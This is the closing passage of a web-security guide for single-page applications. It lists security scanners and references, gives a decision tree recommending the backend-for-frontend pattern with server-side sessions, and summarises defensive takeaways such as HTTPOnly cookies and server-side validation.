    *Client-side cryptography (when appropriate)*

16. **Curity: The Token Handler Pattern**  
    https://curity.io/resources/learn/the-token-handler-pattern/  
    *Modern approach to token management*

### Security Tools

17. **OWASP ZAP** - Web application security scanner  
    https://www.zaproxy.org/

18. **Burp Suite** - Web vulnerability scanner  
    https://portswigger.net/burp

19. **npm audit** - Node.js dependency vulnerability scanner  
    Built into npm

20. **Snyk** - Continuous security monitoring  
    https://snyk.io/

---

## Quick Decision Tree

```
Do you need to call APIs that require secrets/keys?
├─ YES → Use BFF pattern
│         Store secrets server-side
│         Use session-based auth
│
└─ NO → Can use simpler architecture
        But still use HTTPOnly cookies
        Still validate everything server-side
        Still implement CSRF protection

Is your app handling sensitive user data?
├─ YES → Use BFF pattern mandatory
│         Implement full security stack
│         Regular security audits
│
└─ NO → Still implement basic security
        Sessions over tokens
        Server-side validation
        Rate limiting

Are you using OAuth/third-party auth?
├─ YES → Use BFF pattern
│         Never do OAuth flow in browser
│         Store refresh tokens server-side
│
└─ NO → Consider simple session-based auth
        Still use HTTPOnly cookies
        Still validate server-side
```

---

## Summary: Key Takeaways

1. **You cannot store secrets in JavaScript** - Everything in the browser is public
2. **Use HTTPOnly cookies for sessions** - Not localStorage/sessionStorage
3. **BFF handles OAuth and API keys** - Frontend never sees tokens
4. **Server validates everything** - Never trust client input
5. **Defense in depth** - Multiple security layers protect even if one fails
6. **Users control their browser** - Design assuming compromise
7. **Authorization happens server-side** - Every endpoint, every request

**The BFF pattern is not optional for production applications handling real user data or calling APIs with secrets.** It's the industry-standard approach to securing browser-based applications.

---

## Getting Help

If you're implementing this architecture and need assistance:

1. **Security review**: Have a security professional review your implementation
2. **Penetration testing**: Test your application for vulnerabilities
3. **OWASP resources**: Consult OWASP cheat sheets for specific scenarios
4. **Community**: Ask in security-focused communities (r/netsec, security.stackexchange.com)

**Remember**: Security is not a checklist—it's an ongoing process. Stay informed about new vulnerabilities and best practices.

---

*Last updated: February 2026*  
*This guide reflects current best practices for SPA security as of the date of writing. Security landscapes evolve; always verify against current standards.*
